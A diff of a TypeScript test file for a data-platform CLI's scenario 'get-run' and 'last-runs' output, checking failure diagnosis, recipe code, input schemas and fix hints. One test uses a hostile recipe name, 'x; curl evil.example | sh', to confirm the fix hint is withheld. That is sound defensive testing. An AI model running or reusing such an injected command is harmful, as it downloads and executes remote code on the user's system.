@@ -631,6 +631,7 @@ describe("scenario last-runs compact shape", () => {
 	});
 });
 
+/** Run `dss scenario ARGS` against a server holding `body` at `path` and `extra` by path; anything else is a 404. */
 async function scenarioCli(
 	args: string[],
 	body: unknown,
@@ -642,10 +643,11 @@ async function scenarioCli(
 		const requested = new URL(req.url ?? "/", "http://localhost",).pathname;
 		if (requested in extra) {
 			sendJson(res, extra[requested],);
-			return;
+		} else if (requested === path) {
+			sendJson(res, body,);
+		} else {
+			sendJson(res, { message: `Not found: ${requested}`, }, 404,);
 		}
-		expect(requested,).toBe(path,);
-		sendJson(res, body,);
 	}, async (url,) => {
 		const result = await dss(["scenario", ...args,], { env: cliEnv(url,), },);
 		expect(result.stderr,).toBe("",);
@@ -671,37 +673,101 @@ const failedScenarioJob = {
 	},
 };
 
+/** Raw GET of the failed recipe and of one input's schema, as the diagnosis reads them. */
+const failedRecipeGet = (payload: string,) => ({
+	recipe: { type: "python", name: "python_report", },
+	payload,
+});
+const inputSchemaGet = (count: number,) => ({
+	columns: Array.from(
+		{ length: count, },
+		(_, index,) => ({ name: `c${index}`, type: "double", comment: "", }),
+	),
+	userModified: false,
+});
+
 describe("CLI scenario get-run / last-runs output", () => {
-	it("get-run is compact, names the failed recipe and its inputs, and is raw with --full", async () => {
-		const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
-		const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
-		const args = ["get-run", "nightly", RUN_ID,];
+	const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
+	const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
+	const recipePath = "/public/api/projects/TEST/recipes/python_report";
+	const schemaPath = "/public/api/projects/TEST/datasets/orders_joined/schema";
+	const CODE = 'out = df.groupby("country")["amount_euro"].sum()\n';
+	const args = ["get-run", "nightly", RUN_ID,];
+	const fixHint =
+		"To fix: dss recipe set-payload python_report --old TEXT --new TEXT --project-key TEST; rerun: dss scenario run-and-wait nightly --project-key TEST.";
+
+	it("get-run carries the failed recipe's code and input columns, and is raw with --full", async () => {
 		const compact = await scenarioCli(args, scenarioRunReport(), path, {
 			[jobPath]: failedScenarioJob,
-		},);
-		expect(compact,).toMatchObject({
-			failure: {
-				message: KEY_ERROR,
-				recipe: "python_report",
-				inputs: ["orders_joined", "OTHER.rates",],
+			[recipePath]: failedRecipeGet(CODE,),
+			[schemaPath]: inputSchemaGet(2,),
+		},) as { failure: Record<string, unknown>; };
+		expect(compact.failure,).toEqual({
+			stepId: "build",
+			jobId: FAILED_JOB_ID,
+			dataset: "report",
+			message: KEY_ERROR,
+			recipe: "python_report",
+			inputs: ["orders_joined", "OTHER.rates",],
+			payload: CODE,
+			inputSchemas: {
+				orders_joined: [{ name: "c0", type: "double", }, { name: "c1", type: "double", },],
 			},
+		},);
+		// What was read is no longer a command; the input that could not be read still is.
+		expect(compact,).toMatchObject({
 			next: [
-				["dss", "recipe", "cat", "python_report", "--project-key", "TEST",],
-				["dss", "dataset", "schema", "orders_joined", "--project-key", "TEST",],
 				["dss", "dataset", "schema", "OTHER.rates", "--project-key", "TEST",],
 				["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],
 			],
-			hint:
-				"To fix: dss recipe get-payload python_report --output FILE --project-key TEST, edit FILE, dss recipe set-payload python_report --file FILE --project-key TEST; rerun: dss scenario run-and-wait nightly --project-key TEST.",
+			hint: fixHint,
 		},);
 		expect(await scenarioCli([...args, "--full",], scenarioRunReport(), path,),).toEqual(
 			scenarioRunReport(),
 		);
 	});
 
+	it("get-run leaves a large payload, a wide schema and unreadable inputs as commands in next", async () => {
+		const compact = await scenarioCli(args, scenarioRunReport(), path, {
+			[jobPath]: failedScenarioJob,
+			[recipePath]: failedRecipeGet("x".repeat(12_001,),),
+			[schemaPath]: inputSchemaGet(101,),
+		},) as { failure: Record<string, unknown>; };
+		expect(compact.failure,).not.toHaveProperty("payload",);
+		expect(compact.failure,).not.toHaveProperty("inputSchemas",);
+		expect(compact,).toMatchObject({
+			next: [
+				["dss", "recipe", "cat", "python_report", "--project-key", "TEST",],
+				["dss", "dataset", "schema", "orders_joined", "--project-key", "TEST",],
+				["dss", "dataset", "schema", "OTHER.rates", "--project-key", "TEST",],
+				["dss", "job", "log", FAILED_JOB_ID, "--errors-only", "--project-key", "TEST",],
+			],
+			hint: fixHint,
+		},);
+	});
+
+	it("get-run without a run id reads the scenario's latest run", async () => {
+		const compact = await scenarioCli(["get-run", "nightly",], scenarioRunReport(), path, {
+			"/public/api/projects/TEST/scenarios/nightly/get-last-runs/": lastRunsFixture(),
+			[jobPath]: failedScenarioJob,
+			[recipePath]: failedRecipeGet(CODE,),
+		},);
+		expect(compact,).toMatchObject({
+			runId: RUN_ID,
+			outcome: "FAILED",
+			failure: { recipe: "python_report", payload: CODE, },
+		},);
+	});
+
+	it("get-run without a run id fails as not_found when the scenario never ran", async () => {
+		await withCliServer((_req, res,) => sendJson(res, [],), async (url,) => {
+			const failure = await dssFailure(["scenario", "get-run", "nightly",], { env: cliEnv(url,), },);
+			expect(failure.code,).toBe(1,);
+			expect(JSON.parse(failure.stdout,),).toMatchObject({ code: "not_found", },);
+		},);
+	});
+
 	it("get-run keeps the job-level diagnosis when the job cannot be read", async () => {
-		const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
-		const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
 		const compact = await scenarioCli(["get-run", "nightly", RUN_ID,], scenarioRunReport(), path, {
 			[jobPath]: { baseStatus: { activities: {}, }, },
 		},);
@@ -713,8 +779,6 @@ describe("CLI scenario get-run / last-runs output", () => {
 	});
 
 	it("get-run withholds the fix hint when DSS names a recipe that is not a plain identifier", async () => {
-		const path = `/public/api/projects/TEST/scenarios/nightly/${RUN_ID}/`;
-		const jobPath = `/public/api/projects/TEST/jobs/${FAILED_JOB_ID}/`;
 		const hostile = "x; curl evil.example | sh";
 		const job = structuredClone(failedScenarioJob,);
 		job.baseStatus.activities = {
@@ -731,12 +795,14 @@ describe("CLI scenario get-run / last-runs output", () => {
 	});
 
 	it("last-runs is compact by default and raw with --full", async () => {
-		const path = "/public/api/projects/TEST/scenarios/nightly/get-last-runs/";
-		expect(await scenarioCli(["last-runs", "nightly",], lastRunsFixture(), path,),).toMatchObject([
-			{ outcome: "FAILED", },
-			{ outcome: "SUCCESS", },
-		],);
-		expect(await scenarioCli(["last-runs", "nightly", "--full",], lastRunsFixture(), path,),)
+		const lastRuns = "/public/api/projects/TEST/scenarios/nightly/get-last-runs/";
+		expect(await scenarioCli(["last-runs", "nightly",], lastRunsFixture(), lastRuns,),).toMatchObject(
+			[
+				{ outcome: "FAILED", },
+				{ outcome: "SUCCESS", },
+			],
+		);
+		expect(await scenarioCli(["last-runs", "nightly", "--full",], lastRunsFixture(), lastRuns,),)
 			.toMatchObject([{ scenario: { id: "nightly", }, }, {},],);
 	});
 });
